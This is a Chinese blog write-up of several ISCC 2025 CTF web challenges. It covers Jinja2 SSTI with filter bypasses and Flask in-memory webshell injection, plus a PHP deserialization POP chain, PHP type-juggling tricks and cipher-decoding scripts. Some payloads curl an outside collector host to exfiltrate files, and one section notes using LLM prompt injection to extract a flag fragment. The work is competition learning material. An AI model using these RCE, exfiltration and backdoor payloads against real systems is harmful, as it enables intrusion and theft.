+++
title = "ISCC2025区域赛"
slug = "iscc2025-regional-competition"
description = "ISCC原来不是PY是打的啊"
date = "2025-05-14T15:46:33"
lastmod = "2025-05-14T15:46:33"
image = ""
license = ""
categories = ["赛题"]
tags = ["ssti", "php"]
+++

拿了几个血，所以来记录一下，题目质量的话也就那样，但是值得深思

## 十八铜人阵

我利用的payload如下

```http
POST /nauygnoiqnebnat?a=__globals__&b=__getitem__&c=os&d=popen&e=curl+https://4fz7yove.requestrepo.com/`cat+kGf5tN1yO8M|base64` HTTP/1.1
Host: 112.126.73.173:16340
Content-Length: 134
Pragma: no-cache
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Origin: http://112.126.73.173:16340
Referer: http://112.126.73.173:16340/nauygnoiqnebnat
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: session=eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.aCKsMQ.X9UWN4Wx1zFF6vpu-9nl0JU5vDQ
Connection: close

yongzheng={{(lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.e)).read()}}
```

但是很明显我觉得能够继续去打内存马，来测试测试

```python
from flask import Flask
from flask import request
from flask import render_template_string

app=Flask(__name__)

@app.route('/',methods=['GET','POST'])
def index():
    template=''' 
    <p>Hello %s </p>'''%(request.args.get('name'))
    return render_template_string(template)

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=5000)


```

上面的payload其实大家本质也可以看到是

```
?name={{ lipsum.__globals__.__getitem__('os').popen('whoami').read() }}
```

- `request.values` 是最通用的，可以获取GET、POST和文件上传的参数
- `request.form` 专门获取POST表单数据
- `request.args` 专门获取GET参数
- `request.json` 获取JSON格式的POST数据

如果我需要另一种打法，更加传统调用链更仔细

```
{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}

{{config.__class__.__init__.__globals__.__getitem__('os').popen('whoami').read()}}

{{config.__class__.__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')}}

{{config.__class__.__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')("__import__('os').popen('whoami').read()")}}
```

现在已经能够固定使用了，那我们把内存马载入先

```
{{config.__class__.__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')("app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('baozongwi') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'baozongwi\')).read())\")==None else resp)",{'request':url_for.__globals__['request'],'app':url_for.__globals__['current_app']})}}
```

也成功打入，那我们再利用request绕过即可

```http
POST /?name={{config|attr(request.form.a)|attr(request.form.b)|attr(request.form.c)|attr(request.form.d)(request.form.e)|attr(request.form.d)(request.form.f)(request.form.g)}} HTTP/1.1
Host: 127.0.0.1:5000
Cache-Control: no-cache
Referer: http://127.0.0.1:5000/
Accept-Encoding: gzip, deflate, br, zstd
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
sec-ch-ua: "Chromium";v="136", "Google Chrome";v="136", "Not.A/Brand";v="99"
sec-ch-ua-platform: "Windows"
Sec-Fetch-Dest: document
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Sec-Fetch-Mode: navigate
Origin: http://127.0.0.1:5000
Sec-Fetch-Site: none
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Upgrade-Insecure-Requests: 1
Sec-Fetch-User: ?1
Content-Type: application/x-www-form-urlencoded
Pragma: no-cache
Content-Length: 134

a=__class__&b=__init__&c=__globals__&d=__getitem__&e=__builtins__&f=eval&g=__import__('os').popen('whoami').read()
```

```http
POST /?name={{config|attr(request.form.a)|attr(request.form.b)|attr(request.form.c)|attr(request.form.d)(request.form.e)|attr(request.form.d)(request.form.f)(request.form.g,{request.form.h:url_for.__globals__[request.form.i],request.form.j:url_for.__globals__[request.form.k]})}} HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 1042

a=__class__&b=__init__&c=__globals__&d=__getitem__&e=__builtins__&f=eval&g=app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('baozongwi') and exec("global CmdResp;CmdResp=__import__('flask').make_response(__import__('os').popen(request.args.get('baozongwi')).read())")==None else resp)&h=request&i=request&j=app&k=current_app
```

成功打入，但是还是不够优美，所以再继续优化

```http
POST /?name={{config|attr(request.form.a)|attr(request.form.b)|attr(request.form.c)|attr(request.form.d)(request.form.e)|attr(request.form.d)(request.form.f)(request.form.g,{request.form.h:(url_for|attr(request.form.c))|attr(request.form.d)(request.form.h),request.form.j:(url_for|attr(request.form.c))|attr(request.form.d)(request.form.l)})}} HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/x-www-form-urlencoded
Content-Length: 1042

a=__class__&b=__init__&c=__globals__&d=__getitem__&e=__builtins__&f=eval&g=app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('baozongwi') and exec("global CmdResp;CmdResp=__import__('flask').make_response(__import__('os').popen(request.args.get('baozongwi')).read())")==None else resp)&h=request&j=app&l=current_app
```

但是去打远程发现不成功，貌似是过滤了`_`，所以`url_for`用不了了，找一个能够替换的基础属性即可

```
{{get_flashed_messages.__globals__['current_app']}}
{{url_for.__globals__['current_app']}}
```

看过自己做的题，发现都不行，所以我们得换渲染器，去打`before_request()`了，这个情况的话

```
{{config.__class__.__init__.__globals__.__builtins__['eval']("sys.modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda:__import__('os').popen('whoami').read())")}}
```

```http
POST /nauygnoiqnebnat?a=__class__&b=__init__&c=__globals__&d=__getitem__&e=__builtins__&f=eval&g=sys.modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None,[]).append(lambda:__import__('os').popen('whoami').read()) HTTP/1.1
Host: 112.126.73.173:16340
Content-Length: 134
Pragma: no-cache
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/x-www-form-urlencoded
Origin: http://112.126.73.173:16340
Referer: http://112.126.73.173:16340/nauygnoiqnebnat
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: session=eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.aCKsMQ.X9UWN4Wx1zFF6vpu-9nl0JU5vDQ
Connection: close

yongzheng={{config|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)|attr(request.values.d)(request.values.e)|attr(request.values.d)(request.values.f)(request.values.g)}}
```

## 想犯大吴疆土吗

这里我第一关都过不去的，但是我认识infer，他是个杀玩家，直接把第一层秒了

```http
GET /?box1=%E5%8F%A4%E9%94%AD%E5%88%80&box2=%E6%9D%80&box3=%E9%85%92&box4=%E9%93%81%E7%B4%A2%E8%BF%9E%E7%8E%AF HTTP/1.1
Host: 112.126.73.173:49101
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=515a4a744cb2d53dd77dd970febd696a
Connection: close


```

拿到回显

```http
HTTP/1.1 200 OK
Date: Tue, 13 May 2025 03:15:24 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Content-Description: File Transfer
Content-Disposition: attachment; filename="reward.php"
Expires: 0
Cache-Control: must-revalidate
Pragma: public
Content-Length: 1674
Connection: close
Content-Type: application/octet-stream

<?php
if (!isset($_GET['xusheng'])) {
    ?>
    <html>
    <head><title>Reward</title></head>
    <body style="font-family:sans-serif;text-align:center;margin-top:15%;">
        <h2>想直接拿奖励？</h2>
        <h1>尔要试试我宝刀是否锋利吗？</h1>
    </body>
    </html>
    <?php
    exit;
}

error_reporting(0);
ini_set('display_errors', 0);
?>

<?php

// 犯flag.php疆土者，盛必击而破之！

class GuDingDao {
    public $desheng;

    public function __construct() {
        $this->desheng = array();
    }

    public function __get($yishi) {
        $dingjv = $this->desheng;
        $dingjv();
        return "下次沙场相见, 徐某定不留情";
    }
}

class TieSuoLianHuan {
    protected $yicheng;

    public function append($pojun) {
        include($pojun);
    }

    public function __invoke() {
        $this->append($this->yicheng);
    }
}

class Jie_Xusheng {
    public $sha;
    public $jiu;

    public function __construct($secret = 'reward.php') {
        $this->sha = $secret;
    }

    public function __toString() {
        return $this->jiu->sha;
    }

    public function __wakeup() {
        if (preg_match("/file|ftp|http|https|gopher|dict|\.\./i", $this->sha)) {
            echo "你休想偷看吴国机密";
            $this->sha = "reward.php";
        }
    }
}

echo '你什么都没看到？那说明……有东西你没看到<br>';

if (isset($_GET['xusheng'])) {
    @unserialize($_GET['xusheng']);
} else {
    $a = new Jie_Xusheng;
    highlight_file(__FILE__);
}

// 铸下这铁链，江东天险牢不可破！

```

很简单的pop链，直接打即可

```php
<?php
class GuDingDao {
    public $desheng;
}

class TieSuoLianHuan {
    public $yicheng;
}

class Jie_Xusheng {
    public $sha;
    public $jiu;

}

$a=new Jie_Xusheng();
$a->sha=new Jie_Xusheng();
$a->sha->jiu=new GuDingDao();
//$a->sha->jiu->desheng=phpinfo;
$a->sha->jiu->desheng=new TieSuoLianHuan();
$a->sha->jiu->desheng->yicheng='data://text/plain,<?php system("curl https://4fz7yove.requestrepo.com/"); ?>';
echo urlencode(serialize($a));
```

但是发现好像不太对劲，发现远程一点反应都没有，怀疑是参数或者是什么错了，可以看到远程phpinfo都弄不出来，这个东西都是不会被ban的，所以应该是`GuDingDao`这个类有问题，同时随意尝试目录还发现了两个文件但是并没有什么作用

```dockerfile
# 基于官方 PHP-Apache 镜像
FROM php:7.4-apache

# 把代码复制进容器
COPY . /var/www/html/

# 设置工作目录
WORKDIR /var/www/html/

# 启用 Apache mod_rewrite
RUN a2enmod rewrite

# 设置权限（防止 flag.php 访问失败）
RUN chown -R www-data:www-data /var/www/html

# 暴露端口（默认 80）
EXPOSE 80
```

```yml
version: '3.0'

services:
  pojun:
    build: .
    container_name: pojun
    ports:
      - "49101:80"
    restart: unless-stopped
```

源代码里面的谜语为

> 战场上给你的奖励你真敢要？不怕有诈？
>
> 大宝不屑地轻笑：听没听说过8f3505d7？
>
> 旁边有人提醒你：那奖励有1处……他瞥了眼宝将军的宝刀，不敢再继续说下去

那个字符串作用不大，重要的是宝刀，不过这也是我们知道的信息，努力fuzz，搞出类名为`GuDingDa0`，那就很好打了

```php
<?php
class GuDingDa0 {
    public $desheng;
}

class TieSuoLianHuan {
    public $yicheng;
}

class Jie_Xusheng {
    public $sha;
    public $jiu;

}

$a=new Jie_Xusheng();
$a->sha=new Jie_Xusheng();
$a->sha->jiu=new GuDingDa0();
//$a->sha->jiu->desheng=phpinfo;

$a->sha->jiu->desheng=new TieSuoLianHuan();
/*$a->sha->jiu->desheng->yicheng='data://text/plain,<?php system("whoami"); ?>';*/
$a->sha->jiu->desheng->yicheng='php://filter/convert.base64-encode/resource=flag.php';
echo urlencode(serialize($a));
```

## **哪吒的试炼**

看到谜语，猜测传参`?food=lotus root`，查看源码，发现有disabled标签属性，我们直接删掉，即可跳转，得到源码

```php
<?php
if (isset($_POST['nezha'])) {
    $nezha = json_decode($_POST['nezha']);

    $seal_incantation = $nezha->incantation;  
    $md5 = $nezha->md5;  
    $secret_power = $nezha->power;
    $true_incantation = "I_am_the_spirit_of_fire";  

    $final_incantation = preg_replace(
        "/" . preg_quote($true_incantation, '/') . "/", '',
        $seal_incantation
    );

    if ($final_incantation === $true_incantation && md5($md5) == md5($secret_power) && $md5 !== $secret_power) {
        show_flag(); 
    } else {
        echo "<p>封印的力量依旧存在，你还需要再试试!</p>";
    }
} else {
    echo "<br><h3>夜色渐深，风中传来隐隐的低语……</h3>";
    echo "<h3>只有真正的勇者才能找到破局之法。</h3>";
}
?>
```

直接打

```
nezha={"incantation":"I_am_the_spiI_am_the_spirit_of_firerit_of_fire","md5":"240610708","power":"QNKCDZO"}
```

传上去始终没反应，把disabled这个标签属性补上去，有回显了

要进行解密，搞出来表

- 早：suet
- 晴：sueerg
- 枫：wooniw
- 林：woooow
- 红: silrow

`ISCC{sueergsuetsilrowwoooowwooniw}`

## 回归基本功

看到是高级工程师直接输入这个`gaojigongchengshifoyege`，会跳转到`process.php`，然后就502了，后面正常了，看到也并不是正确的文件名什么的，于是改UA头为`GaoJiGongChengShiFoYeGe`，拿到源码

```php
<?php
show_source(__FILE__);
include('E8sP4g7UvT.php');
$a=$_GET['huigui_jibengong.1'];
$b=$_GET['huigui_jibengong.2'];
$c=$_GET['huigui_jibengong.3'];

$jiben = is_numeric($a) and preg_match('/^[a-z0-9]+$/',$b);
if($jiben==1)
{
    if(intval($b) == 'jibengong')
    {
        if(strpos($b, "0")==0)
        {
            echo '基本功不够扎实啊！';
            echo '<br>';
            echo '还得再练！';  
        }
        else
        {
            $$c = $a;
            parse_str($b,$huiguiflag);
            if($huiguiflag[$jibengong]==md5($c))
            {
                echo $flag;
            }
            else{
                echo '基本功不够扎实啊！';
                echo '<br>';
                echo '还得再练！'; 
            }
        } 
    }
    else
    {
        echo '基本功不够扎实啊！';
        echo '<br>';
        echo '还得再练！'; 
    }
}
else
{
    echo '基本功不够扎实啊！';
    echo '<br>';
    echo '还得再练！'; 
}
?> 基本功不够扎实啊！
还得再练！
```

- 第一层：因为and优先级比较低，所以jiben的值只取决于$a的条件，设置$a为数字就行,$a=1
- 第二层：因为字符串在弱比较中如果不是数字形式则会转化成0，所以设置b为0或e都行,$b=e
- 第三层：绕过首字母不是0是限制，用+0或者e都行
- 最后一层：因为有动态变量和变量覆盖，这里需要设置$huiguiflag中的键$jibengong为md5($c)，但是如果直接设置键名为$jibengong貌似行不通，这时候可以用动态变量去操作一下了

```php
?huigui[jibengong.1=1&huigui[jibengong.2=e%261=e559dcee72d03a13110efe9b6355b30d&huigui[jibengong.3=jibengong
```

## ShallowSeek

把已知信息拿到之后，思考X开头的UA，一般是XFF，或者是XML，这里没有提到本地，所以应该是XML，`X-Requested-With:XMLHttpRequest`，在《滕王阁序》模仿里面拿到密钥`387531189`，解密脚本写出来

```python
def decrypt(ciphertext: str, key: list[int]) -> str:

    # 提取序列即密文前 len(key) 个字符，剩余序列是之后的部分
    m = len(key)
    extracted = list(ciphertext[:m])
    chars = list(ciphertext[m:])

    # 按密钥逆序，将每个提取字符插回对应位置（1 起始 → Python 0 起始）
    for k, ch in zip(reversed(key), reversed(extracted)):
        if k < 1 or k > len(chars) + 1:
            raise ValueError(f"密钥数字{k}在插入时越界 (当前长度 {len(chars)})")
        chars.insert(k - 1, ch)

    return ''.join(chars)


if __name__ == "__main__":
    ct = "IbaWEssey"
    key = [4, 3, 5, 1, 3, 3, 2]
    pt = decrypt(ct, key)
    print(f"Ciphertext: {ct}")
    print(f"Key:        {key}")
    print(f"Plaintext:  {pt}")
```

通过LLM注入拿到`01_cu_5_3r35_th3b5t!}`，在前端代码里面找找`/static/evil-buttons.js`

```js
document.addEventListener('DOMContentLoaded', function () {
    const btnA = document.getElementById('btn-a');
    const btnB = document.getElementById('btn-b');
    let aLocked = false;
    let bLocked = false;
    const _ = [0x6c, 0x6f, 0x63, 0x6b];

    // 初始定位
    btnA.style.position = 'absolute';
    btnB.style.position = 'absolute';
    btnA.style.left = '60%';
    btnA.style.top = '100px';
    btnB.style.left = '70%';
    btnB.style.top = '100px';

    function resetPosition(btn, left, top) {
        btn.style.left = left;
        btn.style.top = top;
    }

    window[String.fromCharCode(0x6c,0x6f,0x63,0x6b) + String.fromCharCode(0x41)] = function (k, v) {
        if (btoa(k + String.fromCharCode(0x38) + v) === 'NDM4Mg==') {
            aLocked = true;
            btnA.classList.add('locked');
            resetPosition(btnA, '60%', '100px');
            console.log("A按钮已锁定！");
            fetch('api/mark_frag_ok.php');
        }
    };

    window.lockB = function () {
        bLocked = true;
        btnB.classList.add('locked');
        resetPosition(btnB, '70%', '100px');
        console.log("B按钮已锁定！");
    };

    btnA.addEventListener('mouseenter', function () {
        if (!aLocked) {
            const offsetX = Math.random() * 200 - 100;
            const offsetY = Math.random() * 100 - 50;
            btnA.style.left = `calc(60% + ${offsetX}px)`;
            btnA.style.top = `calc(100px + ${offsetY}px)`;
        }
    });

    btnB.addEventListener('mouseenter', function () {
        if (!bLocked) {
            const offsetX = Math.random() * 200 - 100;
            const offsetY = Math.random() * 100 - 50;
            btnB.style.left = `calc(70% + ${offsetX}px)`;
            btnB.style.top = `calc(100px + ${offsetY}px)`;
        }
    });

    btnA.addEventListener('click', function () {
        if (!aLocked) {
            alert('为什么不试试选B？');
        } else {
            fetch('api/get_frag.php')
                .then(res => res.text())
                .then(data => alert(data))
                .catch(() => alert("读取失败"));
        }
    });

    btnB.addEventListener('click', function () {
        if (!bLocked) {
            fetch('api/hint.php')
                .then(r => r.text())
                .then(txt => alert(txt));
        } else {
            alert('给你讲个笑话：家人告诉程序员：去买两个桔子，如果有西瓜，就买一个，于是他最后买回来一个桔子。');
        }
    });
});
```

直接带着XML头挨着访问路由，拿到第一段，和第二段拼起来不对`ISCC{0p3n01_cu_5_3r35_th3b5t!}`，看起来也确实是没有意义的，把后半部分给进行解密试试

```python
def decrypt_by_index(ciphertext: str, key: list[int]) -> str:
    m = len(key)
    extracted = list(ciphertext[:m])
    chars = list(ciphertext[m:])

    for k, ch in zip(reversed(key), reversed(extracted)):
        if k < 1 or k > len(chars) + 1:
            raise ValueError(f"密钥数字{k}在插入时越界 (当前长度 {len(chars)})")
        chars.insert(k - 1, ch)
        
    return ''.join(chars)


if __name__ == "__main__":
    # ct = "IbaWEssey"
    # key = [4, 3, 5, 1, 3, 3, 2]
    ct="01_cu_5_3r35_th3b5t!"
    key=[3,8,7,5,3,1,1,8,9]
    pt = decrypt_by_index(ct, key)
    print(f"Ciphertext: {ct}")
    print(f"Key:        {key}")
    print(f"Plaintext:  {pt}")
```

`ISCC{0p3n_50urc3_15_th3_b35t!}`正确
